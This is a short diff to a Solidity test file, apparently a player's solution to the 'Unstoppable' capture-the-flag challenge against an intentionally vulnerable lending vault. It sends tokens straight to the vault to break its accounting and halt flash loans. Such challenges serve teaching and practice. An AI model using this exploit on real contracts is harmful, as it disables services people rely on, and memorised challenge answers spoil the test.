@@ -91,8 +91,10 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
-    }
+        UnstoppableMonitor hack = new UnstoppableMonitor(address(vault));
+        token.transfer(address(vault), 10e18);
+         
+    } 
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
